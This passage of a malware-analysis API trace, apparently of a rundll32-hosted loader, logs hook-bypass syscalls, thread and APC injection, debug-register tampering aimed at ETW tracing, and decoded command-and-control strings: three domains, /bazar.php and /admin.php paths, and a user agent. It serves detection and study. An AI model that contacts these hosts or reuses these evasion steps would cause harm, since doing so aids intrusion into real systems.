+[PAR] ULONG  NewAccessProtection    : 0x2 (PAGE_READONLY)
+[RET] [0xe0400edac3]
+
+[CNT] [216]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4FA30 (0x000000E041C8A000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4FA38 (0x1524)
+[PAR] ULONG  NewAccessProtection    : 0x2 (PAGE_READONLY)
+[RET] [0xe0400edac3]
+
+[CNT] [217]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4FA30 (0x000000E041C8C000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4FA38 (0x1ab0)
+[PAR] ULONG  NewAccessProtection    : 0x2 (PAGE_READONLY)
+[RET] [0xe0400edac3]
+
+[CNT] [218]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4FA30 (0x000000E041C8E000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4FA38 (0xad80)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [219]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4FA30 (0x000000E041C99000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4FA38 (0x36)
+[PAR] ULONG  NewAccessProtection    : 0x2 (PAGE_READONLY)
+[RET] [0xe0400edac3]
+
+[CNT] [220]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4FA30 (0x000000E041C9A000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4FA38 (0x330)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [221]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4FA30 (0x000000E041C9B000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4FA38 (0x144)
+[PAR] ULONG  NewAccessProtection    : 0x2 (PAGE_READONLY)
+[RET] [0xe0400edac3]
+
+[CNT] [222]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtFlushInstructionCache> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  BaseAddress   : 0x0
+[PAR] SIZE_T Length        : 0x0
+[RET] [0xe0400ec1eb]
+
+[CNT] [223]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[API] <FreeConsole> in [KERNEL32.DLL] 
+[RET] [0xe041c571c6]
+
+[CNT] [224]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[API] <LdrRegisterDllNotification> in [ntdll.dll] 
+[PAR] ULONG                          Flags                : 0x0
+[PAR] PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction : 0x000000E041C64860
+[PAR] PVOID                          Context              : 0x0
+[PAR] PVOID                          *Cookie              : 0x000000E041C4F898
+[RET] [0xe041c5d64a]
+
+[CNT] [225]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[API] <LdrGetDllHandleEx> in [ntdll.dll] 
+[PAR] ULONG           Flags              : 0x1 (LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT)
+[PAR] PCWSTR          DllPath            : 0x0
+[PAR] PULONG          DllCharacteristics : 0x0
+[PAR] PUNICODE_STRING ModuleFileName     : 0x000000E041C4F8D0 ("C:\Windows\system32\KERNEL32.DLL")
+[PAR] PVOID*          DllHandle          : 0x000000E041C90380
+[RET] [0xe041c6020b]
+
+[CNT] [226]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[API] <LdrGetProcedureAddress> in [ntdll.dll] 
+[PAR] HMODULE       hModule          : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] PAINSI_STRING FunctionName : 0x000000E041C4F840 ("HeapReAlloc")
+[PAR] ULONG         Ordinal          : 0x0
+[PAR] PVOID*        ProcedureAddress : 0x000000E041C4F838
+[RET] [0xe041c5cdb8]
+
+[CNT] [227]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[API] <LdrGetDllHandleEx> in [ntdll.dll] 
+[PAR] ULONG           Flags              : 0x1 (LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT)
+[PAR] PCWSTR          DllPath            : 0x0
+[PAR] PULONG          DllCharacteristics : 0x0
+[PAR] PUNICODE_STRING ModuleFileName     : 0x000000E041C4F900 ("C:\Windows\system32\KERNELBASE.dll")
+[PAR] PVOID*          DllHandle          : 0x000000E041C90388
+[RET] [0xe041c60ede]
+
+[CNT] [228]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtCreateEvent> in [ntdll.dll] 
+[PAR] PHANDLE            EventHandle      : 0x000000E041C4FA50
+[PAR] ACCESS_MASK        DesiredAccess    : 0x1f0003 (EVENT_ALL_ACCESS)
+[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x0
+[PAR] EVENT_TYPE         EventType        : 0x0 (NotificationEvent)
+[PAR] BOOLEAN            InitialState     : 0x0
+[RET] [0xe041c840fb]
+
+[CNT] [229]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtCreateThreadEx> in [ntdll.dll] 
+[PAR] PHANDLE                        ThreadHandle      : 0x000000E041C4F990
+[PAR] ACCESS_MASK                    DesiredAccess     : 0x1f03ff (THREAD_ALL_ACCESS)
+[PAR] POBJECT_ATTRIBUTES             ObjectAttributes  : 0x0
+[PAR] HANDLE                         ProcessHandle     : 0xffffffff
+[PAR] PVOID                          StartRoutine      : 0x00007FFA0361C490 (ntdll.dll!RtlInitializeResource)
+[PAR] PVOID                          Argument          : 0x0
+[PAR] ULONG                          CreateThreadFlags : 0x1 (THREAD_CREATE_FLAGS_CREATE_SUSPENDED)
+[PAR] SIZE_T                         ZeroBits          : 0x0
+[PAR] SIZE_T                         StackSize         : 0x0
+[PAR] SIZE_T                         MaximumStackSize  : 0x0
+[PAR] PNT_PROC_THREAD_ATTRIBUTE_LIST AttributeList     : 0x0
+[RET] [0xe041c8444e]
+
+Thread created by monitored process : Now monitoring [pid 0xa6c][tid 0xabc]
+
+[CNT] [230]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x118
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x000000E041C57BF0 
+[PAR] PVOID           ApcRoutineContext : 0x000000E041C4FA40
+[RET] [0xe041c8506a]
+
+[CNT] [231]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtAlertResumeThread> in [ntdll.dll] 
+[PAR] HANDLE  ThreadHandle          : 0x118
+[PAR] PULONG  PreviousSuspendCount  : 0x0
+[RET] [0xe041c57339]
+
+[CNT] [232]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <RtlAddVectoredExceptionHandler> in [ntdll.dll] 
+[PAR] ULONG                       First   : 0x1
+[PAR] PVECTORED_EXCEPTION_HANDLER Handler : 0x000000E041C5BFA0
+[RET] [0xe041c6781f]
+
+[CNT] [233]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0xFFFFFFFFFFFFFFFE
+[PAR] PCONTEXT ThreadContext : 0x000000E041D0E2F0
+[RET] [0xe041c680fd]
+
+[CNT] [234]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0xfffffffe
+[PAR] PCONTEXT Context      : 0x000000E041D0E2F0
+[FLD]          -> ContextFlags = 0x100010 (CONTEXT_DEBUG_REGISTERS)
+[FLD]          -> Dr0          = 0x00007FFA03692630 (ntdll.dll!NtTraceControl)
+[FLD]          -> Dr7          = 0x1
+[RET] [0xe041c6816e]
+
+[CNT] [235]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <TpAllocWork> in [ntdll.dll] 
+[PAR] PTP_WORK             *WorkReturn     : 0x000000E041D0E810
+[PAR] PTP_WORK_CALLBACK    Callback        : 0x000000E041C53250
+[PAR] PVOID                Context         : 0x000000E041D0E818
+[PAR] PTP_CALLBACK_ENVIRON CallbackEnviron : 0x0
+[RET] [0xe041c678a7]
+
+[CNT] [236]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <TpPostWork> in [ntdll.dll] 
+[PAR] PTP_WORK    Work : 0x000000E03FD92D90
+[RET] [0xe041c678b2]
+
+[CNT] [237]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <TpReleaseWork> in [ntdll.dll] 
+[PAR] PTP_WORK    Work : 0x000000E03FD92D90
+[RET] [0xe041c678bd]
+
+Thread created by monitored process : Now monitoring [pid 0xa6c][tid 0xac4]
+
+[CNT] [238]
+[PTP] [0xa6c] [0xac4] [c:\windows\system32\rundll32.exe]
+[INF] [ Thread is from a Worker Pool ]
+[API] <LoadLibraryExA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x000000E041D0E893 ("iphlpapi.dll")
+[PAR] DWORD   dwFlags    : 0x0 (Same behavior as LoadLibrary)
+[RET] 0x7ffa026353c7
+
+[CNT] [239]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <RtlRemoveVectoredExceptionHandler> in [ntdll.dll] 
+[PAR] PVOID Handle : 0x000000E03FD51AC0
+[RET] [0xe041c678fa]
+
+[CNT] [240]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0xFFFFFFFFFFFFFFFE
+[PAR] PCONTEXT ThreadContext : 0x000000E041D0E2F0
+[RET] [0xe041c67a88]
+
+[CNT] [241]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0xfffffffe
+[PAR] PCONTEXT Context      : 0x000000E041D0E2F0
+[FLD]          -> ContextFlags = 0x100010 (CONTEXT_DEBUG_REGISTERS)
+[FLD]          -> Dr7          = 0x400
+[RET] [0xe041c67afe]
+
+[CNT] [242]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <ReleaseMutex> in [KERNEL32.DLL] 
+[PAR] HANDLE hMutex : 0x0
+[RET] [0xe041c6018c]
+
+[CNT] [243]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <RtlAddVectoredExceptionHandler> in [ntdll.dll] 
+[PAR] ULONG                       First   : 0x1
+[PAR] PVECTORED_EXCEPTION_HANDLER Handler : 0x000000E041C5BFA0
+[RET] [0xe041c6781f]
+
+[CNT] [244]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0xFFFFFFFFFFFFFFFE
+[PAR] PCONTEXT ThreadContext : 0x000000E041D0E300
+[RET] [0xe041c680fd]
+
+[CNT] [245]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0xfffffffe
+[PAR] PCONTEXT Context      : 0x000000E041D0E300
+[FLD]          -> ContextFlags = 0x100010 (CONTEXT_DEBUG_REGISTERS)
+[FLD]          -> Dr0          = 0x00007FFA03692630 (ntdll.dll!NtTraceControl)
+[FLD]          -> Dr7          = 0x1
+[RET] [0xe041c6816e]
+
+[CNT] [246]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <TpAllocWork> in [ntdll.dll] 
+[PAR] PTP_WORK             *WorkReturn     : 0x000000E041D0E820
+[PAR] PTP_WORK_CALLBACK    Callback        : 0x000000E041C53250
+[PAR] PVOID                Context         : 0x000000E041D0E828
+[PAR] PTP_CALLBACK_ENVIRON CallbackEnviron : 0x0
+[RET] [0xe041c678a7]
+
+[CNT] [247]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <TpPostWork> in [ntdll.dll] 
+[PAR] PTP_WORK    Work : 0x000000E03FD92D90
+[RET] [0xe041c678b2]
+
+[CNT] [248]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <TpReleaseWork> in [ntdll.dll] 
+[PAR] PTP_WORK    Work : 0x000000E03FD92D90
+[RET] [0xe041c678bd]
+
+[CNT] [249]
+[PTP] [0xa6c] [0xac4] [c:\windows\system32\rundll32.exe]
+[INF] [ Thread is from a Worker Pool ]
+[API] <LoadLibraryExA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x000000E041D0E8A4 ("crypt32.dll")
+[PAR] DWORD   dwFlags    : 0x0 (Same behavior as LoadLibrary)
+[RET] 0x7ffa026353c7
+
+[CNT] [250]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <RtlRemoveVectoredExceptionHandler> in [ntdll.dll] 
+[PAR] PVOID Handle : 0x000000E03FD517C0
+[RET] [0xe041c678fa]
+
+[CNT] [251]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0xFFFFFFFFFFFFFFFE
+[PAR] PCONTEXT ThreadContext : 0x000000E041D0E300
+[RET] [0xe041c67a88]
+
+[CNT] [252]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0xfffffffe
+[PAR] PCONTEXT Context      : 0x000000E041D0E300
+[FLD]          -> ContextFlags = 0x100010 (CONTEXT_DEBUG_REGISTERS)
+[FLD]          -> Dr7          = 0x400
+[RET] [0xe041c67afe]
+
+[CNT] [253]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <RtlAddVectoredExceptionHandler> in [ntdll.dll] 
+[PAR] ULONG                       First   : 0x1
+[PAR] PVECTORED_EXCEPTION_HANDLER Handler : 0x000000E041C5BFA0
+[RET] [0xe041c6781f]
+
+[CNT] [254]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0xFFFFFFFFFFFFFFFE
+[PAR] PCONTEXT ThreadContext : 0x000000E041D0E2F0
+[RET] [0xe041c680fd]
+
+[CNT] [255]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0xfffffffe
+[PAR] PCONTEXT Context      : 0x000000E041D0E2F0
+[FLD]          -> ContextFlags = 0x100010 (CONTEXT_DEBUG_REGISTERS)
+[FLD]          -> Dr0          = 0x00007FFA03692630 (ntdll.dll!NtTraceControl)
+[FLD]          -> Dr7          = 0x1
+[RET] [0xe041c6816e]
+
+[CNT] [256]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <TpAllocWork> in [ntdll.dll] 
+[PAR] PTP_WORK             *WorkReturn     : 0x000000E041D0E810
+[PAR] PTP_WORK_CALLBACK    Callback        : 0x000000E041C53250
+[PAR] PVOID                Context         : 0x000000E041D0E818
+[PAR] PTP_CALLBACK_ENVIRON CallbackEnviron : 0x0
+[RET] [0xe041c678a7]
+
+[CNT] [257]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <TpPostWork> in [ntdll.dll] 
+[PAR] PTP_WORK    Work : 0x000000E03FD92D90
+[RET] [0xe041c678b2]
+
+[CNT] [258]
+[PTP] [0xa6c] [0xac4] [c:\windows\system32\rundll32.exe]
+[INF] [ Thread is from a Worker Pool ]
+[API] <LoadLibraryExA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x000000E041D0E895 ("ws2_32.dll")
+[PAR] DWORD   dwFlags    : 0x0 (Same behavior as LoadLibrary)
+[RET] 0x7ffa026353c7
+
+[CNT] [259]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <TpReleaseWork> in [ntdll.dll] 
+[PAR] PTP_WORK    Work : 0x000000E03FD92D90
+[RET] [0xe041c678bd]
+
+[CNT] [260]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <RtlRemoveVectoredExceptionHandler> in [ntdll.dll] 
+[PAR] PVOID Handle : 0x000000E03FD51670
+[RET] [0xe041c678fa]
+
+[CNT] [261]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0xFFFFFFFFFFFFFFFE
+[PAR] PCONTEXT ThreadContext : 0x000000E041D0E2F0
+[RET] [0xe041c67a88]
+
+[CNT] [262]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0xfffffffe
+[PAR] PCONTEXT Context      : 0x000000E041D0E2F0
+[FLD]          -> ContextFlags = 0x100010 (CONTEXT_DEBUG_REGISTERS)
+[FLD]          -> Dr7          = 0x400
+[RET] [0xe041c67afe]
+
+[CNT] [263]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <ReleaseMutex> in [KERNEL32.DLL] 
+[PAR] HANDLE hMutex : 0x0
+[RET] [0xe041c63790]
+
+[CNT] [264]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <LdrGetProcedureAddress> in [ntdll.dll] 
+[PAR] HMODULE       hModule          : 0x00007FF9FFEA0000 ("ADVAPI32.dll")
+[PAR] PAINSI_STRING FunctionName : 0x000000E041D0E830 ("SystemFunction025")
+[PAR] ULONG         Ordinal          : 0x0
+[PAR] PVOID*        ProcedureAddress : 0x000000E041D0E828
+[RET] [0xe041c5cdb8]
+
+[CNT] [265]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <LdrGetProcedureAddress> in [ntdll.dll] 
+[PAR] HMODULE       hModule          : 0x00007FF9FFEA0000 ("ADVAPI32.dll")
+[PAR] PAINSI_STRING FunctionName : 0x000000E041D0E830 ("SystemFunction032")
+[PAR] ULONG         Ordinal          : 0x0
+[PAR] PVOID*        ProcedureAddress : 0x000000E041D0E828
+[RET] [0xe041c5cdb8]
+
+[CNT] [266]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <LdrGetProcedureAddress> in [ntdll.dll] 
+[PAR] HMODULE       hModule          : 0x00007FF9FFEA0000 ("ADVAPI32.dll")
+[PAR] PAINSI_STRING FunctionName : 0x000000E041D0E830 ("SystemFunction036")
+[PAR] ULONG         Ordinal          : 0x0
+[PAR] PVOID*        ProcedureAddress : 0x000000E041D0E828
+[RET] [0xe041c5cdb8]
+
+[CNT] [267]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_time64> in [msvcrt.dll] 
+[RET] [0xe041c57d54]
+
+[CNT] [268]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <srand> in [msvcrt.dll] 
+[RET] [0xe041c57d5c]
+
+[CNT] [269]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <CreateMutexA> in [KERNEL32.DLL] 
+[PAR] LPSECURITY_ATTRIBUTES lpMutexAttributes : 0x0
+[PAR] BOOL                  bInitialOwner     : 0x0
+[PAR] LPCTSTR               lpName            : 0x0 (null)
+[RET] [0xe041c58f06]
+
+[CNT] [270]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d18]
+
+[CNT] [271]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD517C0
+[PAR] size_t   size    : 0xd
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD517C0
+[STR]          -> "greshunka.com"
+[RES] int 13
+
+[CNT] [272]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d18]
+
+[CNT] [273]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD517C0
+[PAR] size_t   size    : 0xd
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD517C0
+[STR]          -> "bazarunet.com"
+[RES] int 13
+
+[CNT] [274]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d18]
+
+[CNT] [275]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD517C0
+[PAR] size_t   size    : 0xc
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD517C0
+[STR]          -> "tiguanin.com"
+[RES] int 12
+
+[CNT] [276]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d18]
+
+[CNT] [277]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD5CD00
+[PAR] size_t   size    : 0x72
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD5CD00
+[STR]          -> "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
+[RES] int 114
+
+[CNT] [278]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d18]
+
+[CNT] [279]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD517C0
+[PAR] size_t   size    : 0x10
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD517C0
+[STR]          -> "OV1T557KBIUECUM5"
+[RES] int 16
+
+[CNT] [280]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d18]
+
+[CNT] [281]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD5C7E0
+[PAR] size_t   size    : 0xa
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD5C7E0
+[STR]          -> "/bazar.php"
+[RES] int 10
+
+[CNT] [282]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d18]
+
+[CNT] [283]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD5C6E0
+[PAR] size_t   size    : 0xa
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E7A0
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD5C6E0
+[STR]          -> "/admin.php"
+[RES] int 10
+
+[CNT] [284]
